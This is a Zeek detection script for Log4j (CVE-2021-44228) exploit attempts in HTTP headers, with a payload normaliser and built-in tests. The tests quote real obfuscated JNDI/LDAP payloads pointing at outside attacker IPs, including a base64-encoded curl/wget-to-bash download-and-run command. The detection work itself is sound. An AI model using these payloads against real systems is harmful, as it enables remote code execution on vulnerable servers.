module CVE_2021_44228;
@load-sigs ./ldap_java.sig

#redef exit_only_after_terminate = T; 

export {
    redef enum Notice::Type += {
        LOG4J_ATTEMPT_HEADER,
        LOG4J_LDAP_JAVA,
        LOG4J_SUCCESS
    };

    option log = T;
    # redef'd when running tests with btest. Leave as `F`.
    option run_tests = F;

    # Can be domains or addrs, so just have it be a string.
    option ignorable_target_hosts: set[string] = {};
    # Ignore hosts known to be benign & scanning for this behavior.
    option ignorable_orig_hosts: set[addr] = {};
    # Ignore resp hosts. `ignorable_orig_hosts` is probably what you want. This
    # would be for (1) ignoring internal honeypots that you know will look
    # "exploitable" or a known "malicious" server attempting to exploit
    # vulnerable Java clients.
    option ignorable_resp_hosts: set[addr] = {};

    # Try to normalize payloads to improve change of successfully retrieving the
    # payload information.
    option try_normalize = T;
}

redef enum HTTP::Tags += {
        LOG4J_RCE
    };

redef enum Log::ID += { LOG };

type Info: record {
    ts: time &log;
    uid: string &log;
    http_uri: string &log;
    uri: string &log;
    stem: string &log;
    target_host: string &log;
    target_port: string &log;
    method: string &log;
    is_orig: bool &log;
    name: string &log;
    value: string &log;
    matched_name: bool &log;
    matched_value: bool &log;
    };

type PayloadParts: record {
    uri: string;
    stem: string;
    uri_path: string;
    host: addr;
    port_: port;
    };

# Very general, FPs expected but we're casting a wide net intentionally.
# Approach:
# Match ${
# unless it's ${@ (php junk)
# and only if it has a : in the middle and
# and ending brace.
# See test cases in zeek_init() for what we consider to be a TP/FP.
global exploit_pattern: pattern = /\$\{[^@][^}]+:[^}]+\}/;

# Stack used for `normalize`. Shouldn't be used outside of that function.
global stack: vector of string;

function peek(): string
    {
    if ( |stack| == 0 )
        return "";
    else
        return stack[|stack|-1];
    }

function pop(): string
    {
    if ( |stack| == 0 )
        return "";
    local x = peek();
    stack = stack[0:|stack|-1];
    return x;
    }

function push(x: string)
    {
    stack += x;
    }

function clear_stack()
    {
    stack = vector();
    }

# Attempts to normalize log4j payload to remove most common obfuscations. There
# are effectively an infinite number of ways to do this, so don't expect it to
# cover everything. See tests in `zeek_init()` to understand what it handles.
#
# Algorithm works as follows:
#
# "$" and "{" are pushed onto the stack when encountered.
# Set a flag to show we have seen the first "$" "{" set.
# If we are on our second+ set of "$" "{", start ignoring characters
# If we see a ":" while ignoring, we have passed the function portion and should stop ignoring.
# When we hit a "}", pop the previous "{" and "$" off the stack. If the stack is
# now empty, this was the first instance (i.e., `${jdni...`) and it should be
# preserved, otherwise, remove it.
function normalize(payload: string): string
    {
    # Replace default substitution string with normal formatting string, i.e., ${::-j} -> ${:j}
    payload = gsub(payload, /::\-/, ":");
    local to_remove: set[count];
    local i = 0;
    local ignoring = F;
    local saw_first = F;
    while ( i != |payload| )
        {
        local c = payload[i];
        switch ( c )
            {
            case "$":
                push(c);
                break;
            case "{":
                if ( peek() == "$" )
                    push(c);
                if ( !saw_first )
                    {
                    saw_first = T;
                    }
                else
                    {
                    # Add previous "$"
                    add to_remove[i-1];
                    ignoring = T;
                    }
                break;
            case ":":
                if ( ignoring )
                    {
                    add to_remove[i];
                    ignoring = F;
                    }
                break;
            case "}":
                local open_brace = pop();
                local dollar = pop();
                # We only want to remove internal ones
                if ( dollar == "$" && open_brace == "{" && |stack| > 0 )
                    add to_remove[i];
                break;
            }

        if ( ignoring )
            add to_remove[i];
        ++i;
        }

    local new_payload: vector of string;
    i = 0;
    while ( i != |payload| )
        {
        if ( i !in to_remove )
            new_payload += payload[i];
        ++i;
        }
    clear_stack();
    return join_string_vec(new_payload, "");
    }

# If split doesn't return the expected number of indices, return the default "-"
function safe_split1_w_default(s: string, p: pattern, idx: count, missing: string &default="-"): string
    {
    local tmp = split_string1(s, p);
    if ( |tmp| > idx )
        return tmp[idx];
    else
        return missing;
    }

# Assumes `name` or `value` string passed as `s` has the structure:
# ${jdni:ldap://payload_host:payload_port/path} for the payload. Many examples
# of more complicated obfuscation exist. If the structure is different, fill
# missing fields with "-" so other structures in the wild can be explored in the
# logs. For example, Binary Edge are using the following type of obfuscation:
# ...value='${jndi:${lower:l}${lower:d}a${lower:p}://world443.log4j.bin${upper:a}ryedge.io:80/callback}'
#function parse_payload(s: string): PayloadParts
#    {
#    if ( try_normalize )
#        s = normalize(s);
#    local tmp = split_string(s, /\/\//);
#    local last: string = "-";
#    if ( |tmp| > 0 )
#        last = tmp[(|tmp| - 1)];
#    local payload_uri  = safe_split1_w_default(last, /\}/, 0);
#    local payload_stem = safe_split1_w_default(payload_uri, /\//, 0);
#    local payload_host = safe_split1_w_default(payload_stem, /\:/, 0);
#    local payload_port = safe_split1_w_default(payload_stem, /\:/, 1);
#
#    return PayloadParts($uri=payload_uri, $stem=payload_stem, $host=payload_host, $port_=payload_port);
#    }

function parse_payload(s: string): PayloadParts
{
    local tmp = split_string(s, /\/\//);
    local last: string = "-";
    if ( |tmp| > 0 )
        last = tmp[(|tmp| - 1)];
    local uri  = safe_split1_w_default(last, /\}/, 0);
    local stem = safe_split1_w_default(uri, /\//, 0);

    #local domain_regex = /\/\/[a-z0-9]+([\-\.]{1}[a-z0-9]+)*\.[a-z]{2,6}\/?/;
    local domain_regex = /[A-Za-z0-9]+([\-\.]{1}[A-Za-z0-9]+)*\.[a-zA-Z]{2,6}\/?[A-Za-z0-9]+/;
    #if (/A-Za-z/ in stem)
    #print fmt ("stem is: %s", stem);

    local path=safe_split1_w_default(uri,/\//,1);

    if (/:/ in stem)
        local port_ = to_port(fmt ("%s/tcp",safe_split1_w_default(stem, /\:/, 1)));
    else
            port_=80/tcp;

    local host : addr = 0.0.0.0 ;
    if ( domain_regex in stem )
    {
        # this is a dns situation
        local ph = split_string(stem,/:|\//)[0];
        when ( local h = lookup_hostname(ph) )
        {
            # issue if host is multi homed ie has both IPv4 and IPv6
            if (|h| > 0)
                for (i in h)
                {
			print fmt ("%s", i); 

		    #local a = PayloadParts($uri=uri, $uri_path=path, $stem=stem, $host=i , $port_=port_);
		    #return a; 
                    #event Log4j::build_intel( cid,a);
                }
        }
    }
    else
        host = to_addr(safe_split1_w_default(stem, /\:/, 0));

        if (host != 0.0.0.0)
        {
        #local b = PayloadParts($uri=uri, $uri_path=path, $stem=stem, $host=host , $port_=port_);
	#return b; 
        #event Log4j::build_intel( cid,b);
        }

	local b =  PayloadParts($uri=uri, $uri_path=path, $stem=stem, $host=host , $port_=port_);
        return b;
}


event http_header(c: connection, is_orig: bool, name: string, value: string)
    {
    if ( c$id$orig_h in ignorable_orig_hosts )
        return;
    if ( c$id$resp_h in ignorable_resp_hosts )
        return;
    # Focus is mainly on client headers, but not filtering right now to explore interesting cases in the wild
    # if (!is_orig)
    #     return;
    # Focus is mainly on value of header, but adding 'name' to explore what is being used in the wild
    local matched_name = exploit_pattern in name;
    local matched_value = exploit_pattern in value;
    local http_uri: string = "";
    local http_method: string = "";

    # Handle potentially missing fields
    if ( c$http?$uri )
        http_uri = c$http$uri;
    if ( c$http?$method )
        http_method = c$http$method;

    # Ignore matches that contain binary goop. This was a large contributor to
    # false positives.
    if ( matched_name && !is_ascii(name) )
        return;
    if ( matched_value && !is_ascii(value) )
        return;

    if ( !matched_name && !matched_value )
        return;

    add c$http$tags[LOG4J_RCE];

    local payload: PayloadParts;
    local info: Info;

    # TODO: add to a clusterized set for watching of subsequent traffic (LOG4J_SUCCESS notice).
    if ( matched_name )
        {
        payload = parse_payload(name);
        if ( fmt("%s",payload$host) in ignorable_target_hosts )
            return;
        info = Info($ts=network_time(), $uid=c$uid, $http_uri=http_uri, $uri=payload$uri, $stem=payload$stem, $target_host=fmt("%s",payload$host), $target_port=fmt ("%s",payload$port_), $method=http_method, $is_orig=is_orig, $name=name, $value=value, $matched_name=matched_name, $matched_value=matched_value);
        NOTICE([$note=LOG4J_ATTEMPT_HEADER,
                $conn=c,
                $identifier=cat(c$id$orig_h,c$id$resp_h,c$id$resp_p,cat(name,value)),
                # $suppress_for=3600sec,
                $msg=fmt("Possible Log4j exploit CVE-2021-44228 exploit in header. Refer to sub field for sample of payload, original_URI and list of server headers"),
                $sub=fmt("uri='%s', payload_uri=%s, payload_stem=%s, payload_host=%s, payload_port=%s, method=%s, is_orig=%s, header name='%s',  header value='%s' ", http_uri, payload$uri, payload$stem, payload$host, payload$port_, http_method, is_orig, name, value)]);
        if ( log )
            Log::write(LOG, info);
        }
    if ( matched_value )
        {
        payload = parse_payload(value);

        if ( payload?$host && fmt("%s", payload$host) in ignorable_target_hosts )
            return;

        info = Info($ts=network_time(), $uid=c$uid, $http_uri=http_uri, $uri=payload$uri, $stem=payload$stem, $target_host=fmt ("%s",payload$host), $target_port=fmt ("%s",payload$port_), $method=http_method, $is_orig=is_orig, $name=name, $value=value, $matched_name=matched_name, $matched_value=matched_value);
        NOTICE([$note=LOG4J_ATTEMPT_HEADER,
                $conn=c,
                $identifier=cat(c$id$orig_h,c$id$resp_h,c$id$resp_p,cat(name,value)),
                # $suppress_for=3600sec,
                $msg=fmt("Possible Log4j exploit CVE-2021-44228 exploit in header. Refer to sub field for sample of payload, original_URI and list of server headers"),
                $sub=fmt("uri='%s', payload_uri=%s, payload_stem=%s, payload_host=%s, payload_port=%s, method=%s, is_orig=%s, header name='%s',  header value='%s' ", http_uri, payload$uri, payload$stem, payload$host, payload$port_, http_method, is_orig, name, value)]);
        if ( log )
            Log::write(LOG, info);
        }
    }

event signature_match(state: signature_state, msg: string, data: string)
    {
    if ( !(msg == "log4j_javaclassname_udp" || msg == "log4j_javaclassname_tcp") )
       return;

    NOTICE([$note=LOG4J_LDAP_JAVA,
            $conn=state$conn,
            $identifier=cat(state$conn$id$orig_h,state$conn$id$resp_h,state$conn$id$resp_p),
            # $suppress_for=3600sec,
            $msg=fmt("Possible Log4j exploit CVE-2021-44228 exploit, JAVA over LDAP. Refer to sub field for sample of payload."),
            $sub=data]);
    }

event zeek_init() &priority=5
    {
    if ( log )
        Log::create_stream(CVE_2021_44228::LOG, [$columns=Info, $path="log4j"]);
    }


event zeek_init()
    {
    if ( run_tests )
        {
        print(exploit_pattern in "https://ad.doubleclick.net/ddm/ad/N5631.507083IPINYOU.COM/B26871807.320905003;sz=1x1;ord=16396029064475833;dc_lat=;dc_rdid=;tag_for_child_directed_treatment=;tfua=;gdpr=${GDPR};gdpr_consent=${GDPR_CONSENT_755}?" == F);
        print(exploit_pattern in "/index.php?s=/module/action/param1/${@Die(md5(HelloThinkPHP))}" == F);
        print(exploit_pattern in "/index?s=index/\think\Module/Action/Param/${@phpinfo()}" == F);
        print(exploit_pattern in "${jndi:${lower:l}${lower:d}a${lower:p}://world80.log4j.bin${upper:a}ryedge.io:80/ callback}" == T);
        print(exploit_pattern in "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://45.146.164.160:1389/t}" == T);
        print(exploit_pattern in "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=" == T);
        print(exploit_pattern in "https://foobarstuff.wiz.biz=;dc_rdid=;tag_for_child_directed_treatment=;tfua=;gdpr=${GDPR};gdpr_consent=${GDPR_CONSENT_755}" == F);
        print(normalize("${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=") == "${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=");
        print(normalize("${jndi:${lower:l}${lower:d}a${lower:p}://world80.log4j.bin${upper:a}ryedge.io:80/ callback}") == "${jndi:ldap://world80.log4j.binaryedge.io:80/ callback}");
        print(normalize("${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://45.146.164.160:1389/t}") == "${jndi:ldap://45.146.164.160:1389/t}");
        print(normalize("${jndi:${lower:l${lower:d${lower:a${lower:p}}}}://foo.bar/baz}") == "${jndi:ldap://foo.bar/baz}");

        local empty_str_vector: vector of string;
        push("1");
        print(stack == vector("1"));
        push("2");
        print(stack == vector("1", "2"));
        push("3");
        print(stack == vector("1", "2", "3"));
        print(peek() == "3");
        print(pop() == "3");
        print(peek() == "2");
        print(pop() == "2");
        print(peek() == "1");
        print(pop() == "1");
        print(peek() == "");
        print(pop() == "");
        push("1");
        push("2");
        push("3");
        print(stack == vector("1", "2", "3"));
        clear_stack();
        print(stack == empty_str_vector);
        }
    }
